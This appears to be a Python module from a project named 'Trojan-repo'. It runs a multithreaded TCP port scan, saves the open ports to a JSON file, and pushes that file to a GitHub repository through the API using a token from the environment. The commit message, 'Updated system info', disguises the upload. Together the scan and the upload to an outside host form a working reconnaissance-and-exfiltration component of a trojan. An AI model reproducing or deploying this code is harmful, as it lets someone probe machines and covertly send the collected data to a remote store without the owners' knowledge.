import socket
import platform
import psutil
from datetime import datetime
import os
import json
import requests
import base64
import socket
import threading
import json
from dotenv import load_dotenv

class Portscan:
    def __init__(self, timeout=1):
        self.timeout = timeout
        self.open_ports = []  # List of open ports
        self.lock = threading.Lock()  # Lock for thread-safe access to open_ports

    def scan_port(self, target_ip, port):
        """Scan a single port and add it to the list of open ports if it's open."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                result = s.connect_ex((target_ip, port))
                if result == 0:  # Port is open
                    with self.lock:  # Ensure thread-safe access to the list
                        self.open_ports.append(port)
        except Exception:
            pass

    def scan(self, target_ip, ports):
        """
        Scans the specified ports on a given target IP address using multiple threads.
        """
        threads = []

        # Start a new thread for each port
        for port in ports:
            thread = threading.Thread(target=self.scan_port, args=(target_ip, port))
            threads.append(thread)
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

        return self.open_ports

# Create an instance of the Portscan class
security_tool = Portscan()

# Example of the Portscan module
target_ip = "127.0.0.1"
ports = range(20, 1025)
print("Scanning ports...")
open_ports = security_tool.scan(target_ip, ports)

# Print the open ports
print(f"Open ports: {open_ports}")

# Write the open ports to an output file
output_file = "open_ports.json"
with open(output_file, "w") as file:
    json.dump({"target_ip": target_ip, "open_ports": open_ports}, file, indent=4)

print(f"Open ports have been saved to {output_file}.")

# Read the content of the output file into a variable
with open(output_file, "r") as file:
    data = json.load(file)

# The content of the output file is now stored in the variable 'data'
print("Data from file:", data)


# GitHub repository details
repository_owner = "BlertaJashanica"
repository_name = "Trojan-repo"
file_path = "data/portscan.json"  # Correct file path with filename
file_content = json.dumps(data, indent=4)  # Convert dict to JSON string for GitHub

load_dotenv()  # Load environment variables from .env file
github_token = os.getenv("GITHUB_TOKEN")

commit_message = 'Updated system info'

# GitHub API URL
api_url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/contents/{file_path}"
headers = {
    "Authorization": f"Token {github_token}",
    "Accept": "application/vnd.github.v3+json"
}

# Encode the file content to Base64
file_content_encoded = base64.b64encode(file_content.encode()).decode()

# Check if the file already exists
response = requests.get(api_url, headers=headers)
if response.status_code == 200:
    current_file = response.json()
    sha = current_file["sha"]  # Get the current file's SHA for updates
else:
    sha = None  # File doesn't exist; it will be created

# Prepare the payload for the PUT request
payload = {
    "message": commit_message,
    "content": file_content_encoded,
    "sha": sha
}

# Push the file to GitHub
response = requests.put(api_url, json=payload, headers=headers)
if response.status_code in [200, 201]:
    print("File pushed successfully!")
else:
    print("An error occurred while pushing the file:", response.json())

